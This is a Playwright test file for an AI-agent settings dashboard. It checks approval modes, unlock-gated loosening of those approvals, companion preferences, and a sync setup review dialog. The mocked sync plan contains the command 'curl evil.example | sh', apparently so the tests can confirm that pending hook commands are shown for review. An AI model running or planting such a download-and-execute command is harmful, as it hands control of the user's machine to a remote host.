import { expect, test, type Page, type Request } from '@playwright/test'
import { readFileSync } from 'node:fs'

const fixture = JSON.parse(readFileSync(new URL('../../src/fixtures/overview.mock.json', import.meta.url), 'utf8'))
const companionMenu = JSON.parse(readFileSync(new URL('../../../companion/frontend/menu.json', import.meta.url), 'utf8'))
const KEY = 'k'.repeat(64)

interface Doc {
  schemaVersion: string
  configRoot: string
  approvals: { mode: string; modeFile: string; companion: boolean; overrides: { tools: number; projects: number; alwaysAsk: number }; shadowed: string[]; tools: { tool: string; mode: string; effective: string; from: string; yolo: string; review: string; reason?: string }[] }
  mailbox: { approveAgentSends: boolean }
  sync: { needed: boolean; reasons: string[] }
  companionApp: { file: string; animate: boolean; dimWhenIdle: boolean; smallCompanion: boolean; checkForUpdates: boolean; running: boolean; problem?: string; live?: { shortcut: string; sendShortcut: string; startAtLogin: boolean } }
  canLoosen: boolean
}

const REASON = 'the hook is not installed; add approvals to builtins in the home config and run sync --scope user'

/** A user-level server in the browser: the settings live in doc, and a request with the key may loosen them. */
async function serve(page: Page) {
  const state = {
    doc: {
      schemaVersion: 'settings/v1',
      configRoot: '/Users/you/.agnostic-ai',
      approvals: { mode: 'ask', modeFile: '', companion: false, overrides: { tools: 0, projects: 0, alwaysAsk: 0 }, shadowed: [], tools: [{ tool: 'claude', mode: 'ask', effective: 'ask', from: 'default', yolo: 'hook', review: 'reviewer' }] },
      mailbox: { approveAgentSends: true },
      sync: { needed: false, reasons: [] },
      companionApp: { file: '/Users/you/Library/Application Support/agnostic-ai/companion.json', animate: true, dimWhenIdle: false, smallCompanion: false, checkForUpdates: true, running: false },
      canLoosen: false,
    } as Doc,
    version: 1,
    writes: [] as { body: unknown; key?: string }[],
  }
  const withKey = (request: Request) => request.headers()['x-agnostic-ai-session'] === KEY
  const view = (request: Request) => ({ ...structuredClone(state.doc), canLoosen: withKey(request) })
  await page.route('**/api/views/overview', (route) => route.fulfill({ json: { ...structuredClone(fixture), global: true } }))
  await page.route('**/api/health', (route) => route.fulfill({ json: { ok: true, root: '/Users/you/.agnostic-ai', global: true, ui: true } }))
  await page.route('**/api/session/unlock', async (route) => {
    const body = route.request().postDataJSON() as { code?: string }
    if (body.code === 'abc123') return route.fulfill({ json: { key: KEY } })
    return route.fulfill({ status: 403, json: { error: 'This unlock link was used or has expired.' } })
  })
  await page.route('**/api/views/settings', (route) => {
    const tag = `"v${state.version}"`
    if (route.request().headers()['if-none-match'] === tag) return route.fulfill({ status: 304, headers: { ETag: tag } })
    return route.fulfill({ json: view(route.request()), headers: { ETag: tag } })
  })
  await page.route('**/api/settings', async (route) => {
    const request = route.request()
    const body = request.postDataJSON() as { key: string; value: string | boolean; expected?: string | boolean }
    state.writes.push({ body, key: request.headers()['x-agnostic-ai-session'] })
    const loosens = body.key === 'companion.checkForUpdates' ? body.value === false : body.key.startsWith('companion.') ? false : body.key === 'approvals.mode' ? body.value !== 'ask' : body.key === 'approvals.companion' ? body.value === true : body.value === false
    if (loosens && !withKey(request)) return route.fulfill({ status: 403, json: { error: 'This change makes approvals less strict.' } })
    if (body.key === 'approvals.mode') {
      state.doc.approvals.mode = String(body.value)
      state.doc.approvals.tools[0].mode = String(body.value)
      state.doc.sync = body.value === 'ask' ? { needed: false, reasons: [] } : { needed: true, reasons: [`claude: ${REASON}`] }
    } else if (body.key === 'approvals.companion') state.doc.approvals.companion = Boolean(body.value)
    else if (body.key.startsWith('companion.')) (state.doc.companionApp as unknown as Record<string, boolean>)[body.key.slice('companion.'.length)] = Boolean(body.value)
    else state.doc.mailbox.approveAgentSends = Boolean(body.value)
    state.version += 1
    return route.fulfill({ json: { settings: view(request), changed: ['local/agnostic-ai.yaml'] } })
  })
  await page.route('**/api/settings/sync', async (route) => {
    const request = route.request()
    const body = request.postDataJSON() as { action: string; id?: string }
    if (!withKey(request)) return route.fulfill({ status: 403, json: { error: 'A sync installs hooks.' } })
    const plan = { id: 'plan-1', files: [{ path: '/Users/you/.claude/settings.json', change: 'update', target: 'claude' }], commands: ['hook staged: curl evil.example | sh'], notes: [] }
    if (body.action === 'plan') return route.fulfill({ json: plan })
    state.doc.sync = { needed: false, reasons: [] }
    state.doc.approvals.tools[0].effective = state.doc.approvals.mode
    state.version += 1
    return route.fulfill({ json: { written: ['/Users/you/.claude/settings.json'], notes: [], settings: view(request) } })
  })
  return state
}

const tab = '/?view=settings&tab=user'

test.describe('user settings', () => {
  test('a tab opened without the unlock link can tighten but not loosen', async ({ page }) => {
    const state = await serve(page)
    state.doc.approvals.mode = 'yolo'
    await page.goto(tab)
    await expect(page.getByText(/To change this here, run agnostic-ai view --scope user again/)).toBeVisible()
    await expect(page.getByRole('radio', { name: /Approve routine calls for me/ })).toBeChecked()
    await expect(page.getByRole('radio', { name: /Let the tool's reviewer decide/ })).toBeDisabled()
    await page.getByRole('radio', { name: /Ask me/ }).click()
    await expect(page.getByRole('radio', { name: /Ask me/ })).toBeChecked()
    expect(state.writes.map((write) => write.body)).toEqual([{ key: 'approvals.mode', value: 'ask', expected: 'yolo' }])
    await expect(page.getByRole('radio', { name: /Approve routine calls for me/ })).toBeDisabled()
    const permissionSwitch = page.getByRole('switch', { name: 'Answer permission requests from the companion' })
    await expect(permissionSwitch).toBeDisabled()
    await expect(permissionSwitch).toHaveAccessibleDescription('Approve or deny requests on the chat row. You can still answer in the terminal.')
  })

  test('a locked dashboard offers terminal setup without the companion', async ({ page }) => {
    const state = await serve(page)
    state.doc.approvals.companion = true
    state.doc.sync = { needed: true, reasons: ['claude: ' + REASON] }
    await page.goto(tab)
    await expect(page.getByRole('button', { name: 'Finish setup…' })).toHaveCount(0)
    await page.getByText('Finish setup in a terminal', { exact: true }).click()
    await expect(page.getByText('agnostic-ai sync --scope user', { exact: true })).toBeVisible()
    expect(state.writes).toEqual([])
  })

  test('the unlock link unlocks the tab, removes the code, and a looser mode asks first', async ({ page }) => {
    const state = await serve(page)
    await page.goto(`${tab}#unlock=abc123`)
    await expect(page.getByRole('radio', { name: /Approve routine calls for me/ })).toBeEnabled()
    expect(new URL(page.url()).hash).toBe('')
    await expect(page.getByText(/To change this here/)).toHaveCount(0)

    await page.getByRole('radio', { name: /Approve routine calls for me/ }).click()
    await expect(page.getByText('Approve routine calls for you?')).toBeVisible()
    await page.getByRole('button', { name: 'Cancel' }).click()
    expect(state.writes).toEqual([])
    await expect(page.getByRole('radio', { name: /Ask me/ })).toBeChecked()

    await page.getByRole('radio', { name: /Approve routine calls for me/ }).click()
    await page.getByRole('button', { name: 'Turn on' }).click()
    await expect(page.getByRole('radio', { name: /Approve routine calls for me/ })).toBeChecked()
    expect(state.writes).toEqual([{ body: { key: 'approvals.mode', value: 'yolo', expected: 'ask' }, key: KEY }])
    await expect(page.getByText('Claude Code needs setup.')).toBeVisible()

    await page.getByRole('button', { name: 'Finish setup…' }).click()
    await expect(page.getByText('Review all pending changes to your tool settings, including approvals, before applying them.')).toBeVisible()
    await expect(page.getByText('update /Users/you/.claude/settings.json')).toBeVisible()
    await expect(page.getByText('hook staged: curl evil.example | sh')).toBeVisible()
    await page.getByRole('button', { name: 'Apply', exact: true }).click()
    await expect(page.getByText('Applied: 1 file written.')).toBeVisible()
    await expect(page.getByText(/Claude Code needs setup/)).toHaveCount(0)
  })

  test('a saved permission switch identifies setup that is still required', async ({ page }) => {
    const state = await serve(page)
    state.doc.approvals.companion = true
    state.doc.sync = { needed: true, reasons: ['claude: ' + REASON] }
    await page.goto(tab + '#unlock=abc123')
    const permissionSwitch = page.getByRole('switch', { name: 'Answer permission requests from the companion' })
    await expect(permissionSwitch).toBeChecked()
    await expect(permissionSwitch).toHaveAccessibleDescription(/^Setup required/)
    await expect(page.getByText('Setup changes your tools’ settings files, so you can review the changes first.')).toBeVisible()
    await page.getByRole('button', { name: 'Finish setup…' }).click()
    await expect(page.getByText('update /Users/you/.claude/settings.json')).toBeVisible()
    await page.getByRole('button', { name: 'Apply', exact: true }).click()
    await expect(permissionSwitch).toBeChecked()
    await expect(page.getByText('Setup required', { exact: true })).toBeHidden()
  })

  test('a used unlock code leaves the tab locked', async ({ page }) => {
    await serve(page)
    await page.goto(`${tab}#unlock=deadbeef`)
    await expect(page.getByText(/To change this here/)).toBeVisible()
    expect(new URL(page.url()).hash).toBe('')
  })

  test('a change made in the companion shows in the open tab within seconds', async ({ page }) => {
    const state = await serve(page)
    await page.goto(tab)
    const mailbox = page.getByRole('switch', { name: 'Ask me before an agent sends a message' })
    await expect(mailbox).toHaveAttribute('aria-checked', 'true')
    state.doc.mailbox.approveAgentSends = false
    state.version += 1
    await expect(mailbox).toHaveAttribute('aria-checked', 'false', { timeout: 4_000 })
  })

  test('a locked tab turns on Small companion and shows the shortcuts only while the companion runs', async ({ page }) => {
    const state = await serve(page)
    await page.goto(tab)
    await expect(page.getByText('Global bindings and Start at login show while the companion runs. Change them in its menu.')).toBeVisible()
    const small = page.getByRole('switch', { name: 'Small companion' })
    await small.click()
    await expect(small).toHaveAttribute('aria-checked', 'true')
    expect(state.writes.at(-1)).toEqual({ body: { key: 'companion.smallCompanion', value: true, expected: false }, key: undefined })
    await expect(page.getByRole('switch', { name: /Check for updates/ })).toHaveCount(0)
    await expect(page.locator('[data-companion-item="checkForUpdates"] dd')).toHaveText('On')

    state.doc.companionApp.running = true
    state.doc.companionApp.live = { shortcut: 'Ctrl+Alt+Space', sendShortcut: 'Ctrl+Alt+V', startAtLogin: true }
    state.version += 1
    await expect(page.getByText('Ctrl+Alt+Space')).toBeVisible({ timeout: 4_000 })
    await expect(page.getByText('Global bindings and Start at login show while the companion runs. Change them in its menu.')).toHaveCount(1)
  })

  test('a project view points to the user-level view', async ({ page }) => {
    await page.route('**/api/views/overview', (route) => route.fulfill({ json: structuredClone(fixture) }))
    await page.route('**/api/health', (route) => route.fulfill({ json: { ok: true, root: '/tmp/agnostic-ai', global: false, ui: true } }))
    await page.goto(tab)
    await expect(page.getByText('User settings are in the user-level view.')).toBeVisible()
  })
})


test('companion sections and setting labels follow the shared native menu', async ({ page }) => {
  const state = await serve(page)
  state.doc.companionApp.running = true
  state.doc.companionApp.live = { shortcut: 'Ctrl+Alt+Space', sendShortcut: 'Ctrl+Alt+V', startAtLogin: true }
  await page.goto(tab)
  const sections = page.locator('[data-companion-section]')
  await expect(sections.locator('h3')).toHaveText(companionMenu.sections.map((section: { label: string }) => section.label))
  const supported = new Set(['animate', 'dimWhenIdle', 'smallCompanion', 'approvalsMode', 'approvalsCompanion', 'approveAgentSends', 'shortcut', 'sendShortcut', 'keyboardShortcuts', 'startAtLogin', 'checkForUpdates'])
  for (const section of companionMenu.sections) {
    const region = page.getByRole('region', { name: section.label, exact: true })
    const items = companionMenu.items.filter((item: { id: string; section: string }) => item.section === section.id && supported.has(item.id))
    await expect(region.locator('[data-companion-item]')).toHaveCount(items.length)
    expect(await region.locator('[data-companion-item]').evaluateAll((items) => items.map((item) => item.getAttribute('data-companion-item')))).toEqual(items.map((item: { id: string }) => item.id))
    for (const item of items) {
      const row = region.locator(`[data-companion-item="${item.id}"]`)
      await expect(row).toContainText(item.label)
      if (item.kind === 'switch' && !['startAtLogin', 'checkForUpdates'].includes(item.id)) await expect(row.getByRole('switch', { name: item.label, exact: true })).toBeAttached()
    }
  }
  await expect(page.getByRole('region', { name: 'Permissions', exact: true }).getByRole('table', { name: 'Approvals per tool' })).toBeVisible()
  const choices = companionMenu.items.find((item: { id: string }) => item.id === 'approvalsMode').choices
  await expect(page.locator('.user-settings-choice-label')).toHaveText(choices.map((choice: { label: string }) => choice.label))
  await expect(page.locator('[data-companion-item="shortcut"] dd')).toHaveText('Ctrl+Alt+Space')
  await expect(page.locator('[data-companion-item="sendShortcut"] dd')).toHaveText('Ctrl+Alt+V')
  await expect(page.locator('[data-companion-item="startAtLogin"] dd')).toHaveText('On')
})

for (const [platform, paste] of [['MacIntel', '⌘⇧V'], ['Linux x86_64', 'CtrlShiftV']]) {
  test(`companion shortcut help shares every fixed description on ${platform}`, async ({ page }) => {
    await page.addInitScript((platform) => Object.defineProperty(navigator, 'platform', { get: () => platform }), platform)
    await serve(page)
    await page.goto(tab)
    const help = page.locator('[data-companion-item="keyboardShortcuts"]')
    await help.locator('summary').focus()
    await page.keyboard.press('Enter')
    await expect(help).toHaveAttribute('open')
    await expect(help.locator('dd')).toHaveText(companionMenu.shortcutHelp.map((row: { description: string }) => row.description))
    for (const row of companionMenu.shortcutHelp) await expect(help.locator('dt').filter({ hasText: row.label })).toContainText(row.id === 'paste' ? paste : row.keys.join(''))
    await page.keyboard.press('Space')
    await expect(help).not.toHaveAttribute('open')
    expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true)
  })
}

test('saved automatic checks stay read-only when stopped and stale live bindings stay hidden', async ({ page }) => {
  const state = await serve(page)
  state.doc.companionApp.checkForUpdates = false
  state.doc.companionApp.live = { shortcut: 'Ctrl+Alt+Space', sendShortcut: 'Ctrl+Alt+V', startAtLogin: true }
  await page.goto(tab + '#unlock=abc123')
  const automatic = page.locator('[data-companion-item="checkForUpdates"]')
  await expect(automatic.locator('dd')).toHaveText('Off')
  await expect(automatic.getByRole('switch')).toHaveCount(0)
  await expect(page.locator('[data-companion-item="shortcut"], [data-companion-item="sendShortcut"], [data-companion-item="startAtLogin"]')).toHaveCount(0)
  await expect(page.locator('[data-companion-item="keyboardShortcuts"]')).toBeVisible()
  state.doc.companionApp.running = true
  state.version += 1
  await expect(page.locator('[data-companion-item="shortcut"] dd')).toHaveText('Ctrl+Alt+Space', { timeout: 4_000 })
  state.doc.companionApp.live.shortcut = 'Cmd+Shift+K'
  state.doc.companionApp.live.sendShortcut = 'Ctrl+Shift+B'
  state.doc.companionApp.checkForUpdates = true
  state.version += 1
  await expect(page.locator('[data-companion-item="shortcut"] dd')).toHaveText('Cmd+Shift+K', { timeout: 4_000 })
  await expect(page.locator('[data-companion-item="sendShortcut"] dd')).toHaveText('Ctrl+Shift+B')
  await expect(automatic.locator('dd')).toHaveText('On')
  state.doc.companionApp.running = false
  state.version += 1
  await expect(page.locator('[data-companion-item="startAtLogin"]')).toHaveCount(0, { timeout: 4_000 })
  await expect(automatic.locator('dd')).toHaveText('On')
  expect(state.writes).toEqual([])
})

test('appearance and mailbox writes keep their existing keys and expected values', async ({ page }) => {
  const state = await serve(page)
  await page.goto(tab + '#unlock=abc123')
  const appearance = page.getByRole('region', { name: 'Appearance', exact: true })
  await appearance.getByRole('switch', { name: 'Animate companion', exact: true }).click()
  await expect(appearance.getByRole('switch', { name: 'Animate companion', exact: true })).not.toBeChecked()
  await appearance.getByRole('switch', { name: 'Dim when idle', exact: true }).click()
  await expect(appearance.getByRole('switch', { name: 'Dim when idle', exact: true })).toBeChecked()
  const permissions = page.getByRole('region', { name: 'Permissions', exact: true })
  await permissions.getByRole('switch', { name: 'Ask me before an agent sends a message', exact: true }).click()
  await expect(permissions.getByRole('switch', { name: 'Ask me before an agent sends a message', exact: true })).not.toBeChecked()
  expect(state.writes.map((write) => write.body)).toEqual([
    { key: 'companion.animate', value: false, expected: true },
    { key: 'companion.dimWhenIdle', value: true, expected: false },
    { key: 'mailbox.approveAgentSends', value: false, expected: true },
  ])
})


test('an unreadable companion preference stays unavailable until polling reads the saved value', async ({ page }) => {
  const state = await serve(page)
  state.doc.companionApp.checkForUpdates = true
  state.doc.companionApp.problem = 'companion.json cannot be read'
  await page.goto(tab)
  const appearance = page.getByRole('region', { name: 'Appearance', exact: true })
  const automatic = page.getByRole('region', { name: 'App', exact: true }).locator('[data-companion-item="checkForUpdates"]')
  const label = companionMenu.items.find((item: { id: string }) => item.id === 'checkForUpdates').label
  await expect(automatic.locator('dt')).toHaveText(label)
  await expect(automatic.locator('dd')).toHaveText('Unavailable')
  await expect(automatic.getByRole('switch')).toHaveCount(0)
  await expect(appearance.getByText('The companion settings do not load: companion.json cannot be read', { exact: true })).toBeVisible()
  await expect(appearance.getByRole('switch', { name: 'Animate companion', exact: true })).toBeDisabled()
  delete state.doc.companionApp.problem
  state.doc.companionApp.checkForUpdates = false
  state.version += 1
  await expect(automatic.locator('dd')).toHaveText('Off', { timeout: 4_000 })
  await expect(automatic.locator('dt')).toHaveText(label)
  await expect(automatic.getByRole('switch')).toHaveCount(0)
  await expect(appearance.getByText(/The companion settings do not load:/)).toHaveCount(0)
  await expect(appearance.getByRole('switch', { name: 'Animate companion', exact: true })).toBeEnabled()
  expect(state.writes).toEqual([])
})
